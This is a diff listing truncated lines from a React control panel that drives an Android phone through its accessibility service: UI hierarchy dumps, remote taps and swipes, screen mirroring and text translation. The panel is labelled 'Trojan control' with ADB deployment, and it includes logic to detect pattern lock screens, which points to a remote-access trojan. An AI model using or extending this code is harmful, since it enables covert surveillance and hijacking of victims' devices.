@@ -1,0 +1,90 @@
+Home tab 起始行: 2084
+   20|Reader        |import ReaderView from '../components/control/ReaderView'
+   68|Reader        |function getReaderRoot(data) { if (!data || typeof data === 'string') return null; if (Array.isArray(data)) return { id:
+   69|Reader        |function collectReaderNodes(node, out = []) { if (!node || typeof node !== 'object') return out; const b = node.bounds; 
+   72|Reader        |function hasMeaningfulReaderData(data) { if (!data) return false; if (typeof data === 'string') return data.trim().lengt
+   73|Reader        |function normalizeReaderPayload(r) { const data = typeof r === 'string' ? parseHierarchyXml(r) || r : r?.xml ? parseHier
+  192|Reader        |const [readerActive, setReaderActive] = useState(false)
+  193|reader        |const readerActiveRef = useRef(false)
+  194|reader        |const readerLastTsRef = useRef(0)
+  196|Reader        |const [readerData, setReaderData] = useState(null)
+  197|Reader        |const [readerTranslating, setReaderTranslating] = useState(false)
+  198|Reader        |const [readerLoading, setReaderLoading] = useState(false)
+  199|Reader        |const [readerError, setReaderError] = useState('')
+  211|Reader        |const [readerBgColor, setReaderBgColor] = useState('#000000')
+  212|Reader        |const [readerTextColor, setReaderTextColor] = useState('#e1ff00')
+  213|Reader        |const [readerFontSize, setReaderFontSize] = useState(12)
+  220|无障碍           |// 首页选项卡 - 无障碍投屏/录屏模式 (null | 'screen' | 'record')
+  221|accessibility |const [accessibilityScreenMode, setAccessibilityScreenMode] = useState(null)
+  357|reader        |const wsRef = useRef(null), pingRef = useRef(0), reconnectRef = useRef(null), screenshotIntervalRef = useRef(null), last
+  368|reader        |if (!readerData) return null
+  369|reader        |return findPatternViewBounds(readerData)
+  370|reader        |}, [readerData])
+  374|reader        |return isPatternLockScreen(readerData)
+  375|reader        |}, [readerData])
+  852|accessibility |if (type === 'accessibility_status' || type === 'ACCESSIBILITY_STATUS' || type === 'QUERY_ACCESSIBILITY_STATUS') {
+  855|无障碍           |addLog(`无障碍状态: ${status}`);
+  870|Reader        |const readerTypes = ['reader_data', 'accessibility_data', 'ui_hierarchy', 'accessibility_dump']; if (readerTypes.include
+  876|无障碍           |centerToast('设备未连接 Device WS（需要无障碍服务在线）', 'err');
+ 1106|Reader        |function requestReaderData({ silent = false } = {}) {
+ 1107|Reader        |setReaderActive(true); readerActiveRef.current = true; setReaderError('')
+ 1108|Reader        |if (!silent) { readerLoadingRef.current = true; setReaderLoading(true) }
+ 1109|无障碍           |// ★ 走 WebSocket 无障碍通道：发送 GET_UI_HIERARCHY 命令（精简参数，设备端只认 maxDepth）
+ 1111|reader        |clearTimeout(readerTimeoutRef.current)
+ 1112|Reader        |readerTimeoutRef.current = setTimeout(() => { if (readerLoadingRef.current) { readerLoadingRef.current = false; setReade
+ 1114|Reader        |function requestReaderAfterAction() { if (!readerActive) return; clearTimeout(readerRefreshTimerRef.current); readerRefr
+ 1149|无障碍           |// 旧前端投屏流程：先开启无障碍，再发送 SCREEN_CAPTURE_SET_TECH
+ 1155|accessibility |data: { type: 'SCREEN_CAPTURE_SET_TECH', data: { tech: mode === 'system' ? 'mediaprojection' : 'accessibility' } },
+ 1159|accessibility |sendCmd('SCREEN_CAPTURE_SET_TECH', { tech: mode === 'system' ? 'mediaprojection' : 'accessibility' })
+ 1217|无障碍           |// 滑动：发送 SWIPE_PATH 手势格式（无障碍专用，不触发系统手势）
+ 1220|Reader        |requestReaderAfterAction()
+ 1224|Reader        |requestReaderAfterAction()
+ 1227|Reader        |function toggleReader() { const n = !readerActive; setReaderActive(n); readerActiveRef.current = n; if (n) requestReader
+ 1229|reader        |// 翻译阅读器内容：提取所有 text 节点，批量翻译为中文，替换回 readerData
+ 1230|Reader        |async function translateReaderData() {
+ 1231|reader        |if (!readerData || readerTranslating) return
+ 1232|Reader        |setReaderTranslating(true)
+ 1242|reader        |const root = readerData.root || readerData
+ 1243|reader        |collect(root, root === readerData ? [] : ['root'])
+ 1244|Reader        |if (texts.length === 0) { centerToast('没有可翻译的文本'); setReaderTranslating(false); return }
+ 1249|Reader        |if (!result.success || !result.translated) { centerToast('翻译失败'); setReaderTranslating(false); return }
+ 1250|reader        |// 深拷贝 readerData 并替换文本
+ 1251|reader        |const copy = JSON.parse(JSON.stringify(readerData))
+ 1258|Reader        |setReaderData(copy)
+ 1261|Reader        |setReaderTranslating(false)
+ 1430|Reader        |useEffect(() => { if (!readerActive) return; const t = setInterval(() => requestReaderData({ silent: true }), 2000); ret
+ 1456|无障碍           |'🎯 木马控制': { title: '木马控制', desc: 'ADB部署与无障碍服务控制', custom: true },
+ 1846|reader        |readerBgColor={readerBgColor}
+ 1847|Reader        |setReaderBgColor={setReaderBgColor}
+ 1848|reader        |readerTextColor={readerTextColor}
+ 1849|Reader        |setReaderTextColor={setReaderTextColor}
+ 1850|reader        |readerFontSize={readerFontSize}
+ 1851|Reader        |setReaderFontSize={setReaderFontSize}
+ 1854|reader        |readerActive={readerActive}
+ 1855|reader        |readerData={readerData}
+ 1856|reader        |readerLoading={readerLoading}
+ 1857|reader        |readerTranslating={readerTranslating}
+ 1858|Reader        |translateReaderData={translateReaderData}
+ 1859|Reader        |toggleReader={toggleReader}
+ 1860|Reader        |requestReaderAfterAction={requestReaderAfterAction}
+ 2248|reader        |<span style={{ color: readerActive ? '#4ade80' : '#64748b', fontSize: 10, marginLeft: 'auto' }}>{readerActive ? '● 已连接' 
+ 2249|Reader        |<button onClick={toggleReader} style={{ padding: '3px 10px', borderRadius: 6, fontSize: 10, fontWeight: 600, cursor: 'po
+ 2250|reader        |{readerActive ? '✕ 关闭' : '▶ 开启'}
+ 2253|reader        |{readerActive && (
+ 2256|reader        |{readerLoading && !readerData
+ 2258|Reader        |: <ReaderView
+ 2259|reader        |data={readerData}
+ 2260|Reader        |onTap={(x, y) => { setXy({ x, y }); sendControl('TAP', { x, y }); requestReaderAfterAction() }}
+ 2264|Reader        |requestReaderAfterAction()
+ 2269|Reader        |requestReaderAfterAction()
+ 2286|无障碍           |/* ── PC 端：无障碍阅读器 + 无障碍投屏/录屏 风格（居中） ── */
+ 2288|无障碍           |{/* ── 手机1：无障碍阅读器 ── */}
+ 2291|reader        |<span style={{ width: 6, height: 6, borderRadius: '50%', background: readerActive ? '#52c41a' : '#555' }} />
+ 2292|无障碍           |<span style={{ fontSize: 12, color: 'rgba(255,255,255,0.65)', fontWeight: 500 }}>无障碍阅读器</span>
+ 2293|reader        |<span style={{ color: readerActive ? '#52c41a' : 'rgba(255,255,255,0.35)', fontSize: 10, marginLeft: 'auto' }}>{readerAc
+ 2294|Reader        |{readerActive && readerData && <button type="button" onClick={translateReaderData} disabled={readerTranslating} style={{
+ 2295|Reader        |<button type="button" onClick={toggleReader} style={{ padding: '3px 10px', border: '1px solid #303030', borderRadius: 4,
+ 2299|Reader        |{readerActive ? (readerLoading && !readerData ? <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'ce
+ 2310|无障碍           |{/* ── 手机2：无障碍投屏/录屏（共用一个屏幕，走 WebSocket 无障碍通道） ── */}
+ 2314|无障碍           |<span style={{ fontSize: 12, color: 'rgba(255,255,255,0.65)', fontWeight: 500 }}>无障碍投屏</span>
+ 2328|无障碍           |{screenSrc ? <img src={screenSrc} alt="screen" draggable="false" style={{ pointerEvents: 'none', userSelect: 'none', wid
